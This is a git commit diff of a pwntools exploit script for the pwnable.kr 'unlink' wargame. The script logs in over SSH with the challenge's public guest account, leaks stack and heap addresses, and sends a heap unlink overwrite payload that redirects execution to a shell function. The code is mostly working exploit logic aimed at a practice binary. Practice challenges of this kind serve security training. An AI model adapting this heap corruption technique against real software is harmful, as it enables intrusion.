03f81d1f80c4bf1f49d52fe656d40e7d09a5383a
elklepo <klepackijacek94@gmail.com>
2018-11-29 23:20:22 +0100

    added working exploit for unlink task

--- pwnable_kr/unlink.py
+++ pwnable_kr/unlink.py
@@ -2,8 +2,6 @@
 import struct
 from pwn import *
 
-#t = process('./unlink')
-
 s = ssh(host='pwnable.kr', port=2222,
         user='unlink',
         password='guest')
@@ -11,11 +9,6 @@ s = ssh(host='pwnable.kr', port=2222,
 context.log_level = 'debug'
 
 t = s.process(["./unlink"])
-
-gdb.attach(t, '''
-break main
-continue
-''')
 
 line = t.readline()
 stack_leak = int(line[-9:-1], 16)
@@ -27,7 +20,7 @@ shell_addr = struct.pack("<I", 0x080484eb)
 buff_addr =  struct.pack("<I", heap_leak + 0xc)
 stack_addr = struct.pack("<I", stack_leak + 0x10)
 
-input = shell_addr + 'A'*20 + buff_addr + stack_addr
+input = shell_addr + 'A'*12 + buff_addr + stack_addr # 'A'*20 if min allocation unit is 32b instead of 24b
 
 t.sendline(input)
 t.interactive()
